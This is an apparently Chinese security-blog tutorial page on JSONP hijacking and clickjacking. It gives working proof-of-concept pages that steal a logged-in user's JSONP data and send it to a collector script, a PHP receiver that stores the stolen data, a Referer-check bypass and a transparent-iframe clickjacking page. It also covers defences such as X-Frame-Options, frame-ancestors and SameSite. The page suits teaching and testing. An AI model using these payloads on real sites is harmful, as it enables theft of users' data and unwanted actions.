@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JSONP 点击劫持 / 点击劫持 漏洞详解与防护</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@介绍 JSONP 点击劫持漏洞原理、POC、绕过方法，以及点击劫持的演示与防护（X-Frame-Options、SameSite）。">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="https://hzhsec.github.io/list/base_bug/xss/xss6/">
+
+    <link rel="alternate" type="application/rss+xml" href="https://hzhsec.github.io//index.xml" title="Hzhsec home">
+
+    
+
+
+<script async defer data-website-id="3bfa7bff-77f4-4fe9-ad96-a44d83f72465" src="https://umami-evtq.vercel.app/baize"></script>
+
+    <meta property="og:title" content="JSONP 点击劫持 / 点击劫持 漏洞详解与防护" />
+<meta property="og:description" content="介绍 JSONP 点击劫持漏洞原理、POC、绕过方法，以及点击劫持的演示与防护（X-Frame-Options、SameSite）。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hzhsec.github.io/list/base_bug/xss/xss6/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2025-10-16T17:15:00+08:00" />
+<meta property="article:modified_time" content="2025-10-16T17:15:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="JSONP 点击劫持 / 点击劫持 漏洞详解与防护"/>
+<meta name="twitter:description" content="介绍 JSONP 点击劫持漏洞原理、POC、绕过方法，以及点击劫持的演示与防护（X-Frame-Options、SameSite）。"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "https://hzhsec.github.io/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "https://hzhsec.github.io/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "XSS漏洞",
+      "item": "https://hzhsec.github.io/list/base_bug/xss/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "JSONP 点击劫持 / 点击劫持 漏洞详解与防护",
+      "item": "https://hzhsec.github.io/list/base_bug/xss/xss6/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "JSONP 点击劫持 / 点击劫持 漏洞详解与防护",
+  "name": "JSONP 点击劫持 \/ 点击劫持 漏洞详解与防护",
+  "description": "介绍 JSONP 点击劫持漏洞原理、POC、绕过方法，以及点击劫持的演示与防护（X-Frame-Options、SameSite）。",
+  "keywords": [
+    "JSONP", "点击劫持", "绕过", "CSP", "X-Frame-Options"
+  ],
+  "articleBody": "JSONP（JSON with Padding）是一种用于解决跨域数据请求的变通方案，核心原理是利用 '\" frameborder=\"0\"\u003e\u003c/iframe\u003e 工具： https://github.com/yuebusao/jsonp-burp-killer\nJSONP 导致 XSS 的条件 当返回的 MIME 类型或处理方式使浏览器将响应当作可执行脚本（例如 text/html）时，且服务端直接把 callback 未做校验地拼接到输出中，可能导致反射型 XSS。 PHP 默认 Content-Type 常为 text/html，在某些情况下需特别关注 PHP 后端的 JSONP 接口。 点击劫持漏洞（Clickjacking） 点击劫持是一种利用 UI 覆盖诱导用户误点击的攻击，攻击者在其页面上用透明或半透明的 iframe 嵌入目标页面，并在上面放置诱导点击的元素，使得用户以为在点击攻击者页面的按钮，实际上是在操作目标页面的敏感按钮（例如删除、授权、支付等）。\n点击劫持 PoC \u003c!DOCTYPE HTML\u003e \u003chtml\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /\u003e \u003chead\u003e \u003ctitle\u003e点击劫持\u003c/title\u003e \u003cstyle\u003e html,body,iframe { display:block; height:100%; width:100%; margin:0; padding:0; border:none; } iframe { opacity:0.5; filter:alpha(opacity=0); position:absolute; z-index:2; } button { position:absolute; top:450px; left:850px; z-index:1; width:72px; height:26px; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e 万万想不到 \u003cbutton\u003e查看详情\u003c/button\u003e \u003ciframe src=\"https://www.baidu.com/p/9536743109\"\u003e\u003c/iframe\u003e \u003c/body\u003e \u003c/html\u003e 注释：通过调整 iframe 的 opacity、按钮位置（top/left）及大小，可将按钮对准目标页面上的敏感操作按钮，诱导点击。\n防护（抗点击劫持） 最简单且常用的防护方式是禁止敏感页面被 iframe 嵌入，常见实现方式：\n使用 X-Frame-Options 响应头 DENY：禁止任何站点通过 iframe 嵌入该页面。 SAMEORIGIN：只允许同源页面通过 iframe 嵌入。 ALLOW-FROM uri：允许特定来源嵌入（部分浏览器兼容性问题）。 示例（PHP）：\nheader(\"X-Frame-Options: DENY\"); 使用 CSP 的 frame-ancestors 指令 Content-Security-Policy: frame-ancestors 'self'; 其他补充措施 使用 SameSite（Lax 或 Strict）减少跨站请求携带 cookie，降低攻击成功率。 对重要操作增加二次确认或验证码、使用 POST 验证来源、检测 Referer/Origin 并拒绝异常来源。 合规与建议 在进行此类测试或复现时，请先获取明确书面授权并限定测试范围/窗口。 对发现的高危问题（如能外带凭据或导致敏感操作被触发）应立刻与目标方沟通并给出修复建议（例如添加 HttpOnly、设置 X-Frame-Options、限制 JSONP 回调白名单）。 ",
+  "wordCount" : "371",
+  "inLanguage": "en",
+  "datePublished": "2025-10-16T17:15:00+08:00",
+  "dateModified": "2025-10-16T17:15:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://hzhsec.github.io/list/base_bug/xss/xss6/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsec home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://hzhsec.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/static/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/static/hzhsec.png">
+
+<link rel="manifest" href="/static/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>JSONP 点击劫持 / 点击劫持 漏洞详解与防护</h1>
+  </header>
+
+  <p>
+  <small>
+    October 16, 2025&nbsp;· 371 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞原理与利用流程">漏洞原理与利用流程</a></li>
+    <li><a href="#演示-demo后端模拟接口">演示 Demo（后端模拟接口）</a></li>
+    <li><a href="#poc恶意页面示例">PoC（恶意页面示例）</a></li>
+    <li><a href="#常用-payload万能-poc">常用 Payload（万能 PoC）</a></li>
+    <li><a href="#jsonp-绕过技巧">JSONP 绕过技巧</a>
+      <ul>
+        <li><a href="#绕过-referer-检测">绕过 Referer 检测</a></li>
+        <li><a href="#jsonp-导致-xss-的条件">JSONP 导致 XSS 的条件</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#点击劫持-poc">点击劫持 PoC</a></li>
+    <li><a href="#防护抗点击劫持">防护（抗点击劫持）</a>
+      <ul>
+        <li><a href="#使用-x-frame-options-响应头">使用 X-Frame-Options 响应头</a></li>
+        <li><a href="#使用-csp-的-frame-ancestors-指令">使用 CSP 的 frame-ancestors 指令</a></li>
+        <li><a href="#其他补充措施">其他补充措施</a></li>
+      </ul>
+    </li>
+    <li><a href="#合规与建议">合规与建议</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><p>JSONP（JSON with Padding）是一种用于解决跨域数据请求的变通方案，核心原理是<strong>利用 <code>&lt;script&gt;</code> 标签的跨域特性绕过同源策略</strong>。通过将返回内容包裹在回调函数中，使得数据以 JavaScript 的形式被执行。</p>
+<h1 id="jsonp-点击劫持漏洞">JSONP 点击劫持漏洞</h1>
+<p>JSONP（JSON with Padding）是一种用于解决跨域数据请求的变通方案，核心原理是<strong>利用 <code>&lt;script&gt;</code> 标签的跨域特性绕过同源策略</strong>。通过将返回内容包裹在回调函数中，使得数据以 JavaScript 的形式被执行。</p>
+<p>早期前后端分离尚不成熟时，这类接口设计比较常见，若后端在返回时直接把敏感数据通过回调函数输出并信任 <code>callback</code> 参数，就可能被攻击者利用来窃取登录用户的数据。</p>
+<hr>
+<h2 id="漏洞原理与利用流程">漏洞原理与利用流程</h2>
+<ol>
+<li>找到返回敏感信息的 JSONP 接口（例如返回用户信息且依赖 session 登录态）。</li>
+<li>构造一个恶意页面 <code>jsonp.html</code>，在页面中通过 <code>&lt;script src=&quot;...callback=attackerFunction&quot;&gt;</code> 加载目标接口。</li>
+<li>当登录用户访问该恶意页面时，目标接口会以 <code>attackerFunction({...})</code> 形式返回敏感数据，攻击者的 <code>attackerFunction</code> 会在页面中接收并外带这些数据到攻击者服务器。</li>
+</ol>
+<hr>
+<h2 id="演示-demo后端模拟接口">演示 Demo（后端模拟接口）</h2>
+<p>示例接口：<code>http://test:8069/test.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-type:application/json&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$callback <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;callback&#39;</span>];
+</span></span><span style="display:flex;"><span>$name <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;name&#39;</span>]; <span style="color:#75715e">// 模拟 admin 的 session
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $callback<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;({&#39;id&#39;:1,&#39;name&#39;:&#39;Sentiment&#39;,&#39;pwd&#39;:&#39;123456&#39;,&#39;key&#39;:&#39;88888&#39;})&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>当用户以 admin 登录并访问：<code>http://test:8069/test.php?callback=testme</code>，返回：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>testme({&#39;id&#39;:1,&#39;name&#39;:&#39;Sentiment&#39;})
+</span></span></code></pre></div><p>攻击者可以把这个返回结果在其页面中接收并外带敏感信息。</p>
+<hr>
+<h2 id="poc恶意页面示例">PoC（恶意页面示例）</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">title</span>&gt;poc&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://code.jquery.com/jquery-3.6.0.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">testname</span>(<span style="color:#a6e22e">v</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;json hack&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">h</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">v</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">v</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; ,&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">h</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">a</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">h</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 数据外带
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;http://localhost:3000/js_xss/value.php?value=&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">h</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- 访问目标 JSONP 接口并将回调绑定到 testname --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1:3000/js_xss/test.php?callback=testname&amp;name=admin&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>后端接收示例（PHP）可把接收到的数据写入文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$value <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;value&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($value) {
+</span></span><span style="display:flex;"><span>    $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#39;value.txt&#39;</span>, <span style="color:#e6db74">&#39;w+&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($file) {
+</span></span><span style="display:flex;"><span>        $value <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($value);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fwrite</span>($file, $value);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fclose</span>($file);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">&#34;Failed to open file: value.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">&#34;No value parameter provided&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><hr>
+<h2 id="常用-payload万能-poc">常用 Payload（万能 PoC）</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;en&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;referrer&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;never&#34;</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">title</span>&gt;jsonp&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">h1</span>&gt;万能poc&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">testname</span>(<span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hacker_data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;&lt;p&gt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hacker_data</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/p&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">hacker_data</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlHttp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:3000/js_xss/value.php?value=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">hacker_data</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xmlHttp</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#a6e22e">url</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xmlHttp</span>.<span style="color:#a6e22e">send</span>(<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1:3000/js_xss/test.php?callback=testname&amp;name=admin&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><hr>
+<h2 id="jsonp-绕过技巧">JSONP 绕过技巧</h2>
+<h3 id="绕过-referer-检测">绕过 Referer 检测</h3>
+<ul>
+<li>有些站点仅简单检查 Referer 中是否包含自身域名字段（如 <code>assc.com</code>），可以在恶意页面 URL 中加入该字段来绕过（<code>http://attack.com/1.html?a=assc.com</code>）。</li>
+<li>有时站点允许空 Referer，可利用 <code>iframe</code> 加载 <code>javascript:</code> 伪协议来发起无 Referer 请求：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:&#39;&lt;script&gt;function testname(data){alert(JSON.stringify(data));}&lt;/script&gt;&lt;script src=http://127.0.0.1:3000/js_xss/test.php?callback=testname&amp;name=admin&gt;&lt;/script&gt;&#39;&#34;</span> <span style="color:#a6e22e">frameborder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span></code></pre></div><p>工具： <a href="https://github.com/yuebusao/jsonp-burp-killer">https://github.com/yuebusao/jsonp-burp-killer</a></p>
+<h3 id="jsonp-导致-xss-的条件">JSONP 导致 XSS 的条件</h3>
+<ul>
+<li>当返回的 MIME 类型或处理方式使浏览器将响应当作可执行脚本（例如 <code>text/html</code>）时，且服务端直接把 <code>callback</code> 未做校验地拼接到输出中，可能导致反射型 XSS。</li>
+<li>PHP 默认 <code>Content-Type</code> 常为 <code>text/html</code>，在某些情况下需特别关注 PHP 后端的 JSONP 接口。</li>
+</ul>
+<hr>
+<h1 id="点击劫持漏洞clickjacking">点击劫持漏洞（Clickjacking）</h1>
+<p>点击劫持是一种利用 UI 覆盖诱导用户误点击的攻击，攻击者在其页面上用透明或半透明的 <code>iframe</code> 嵌入目标页面，并在上面放置诱导点击的元素，使得用户以为在点击攻击者页面的按钮，实际上是在操作目标页面的敏感按钮（例如删除、授权、支付等）。</p>
+<hr>
+<h2 id="点击劫持-poc">点击劫持 PoC</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE HTML&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html; charset=utf-8&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">title</span>&gt;点击劫持&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">style</span>&gt;
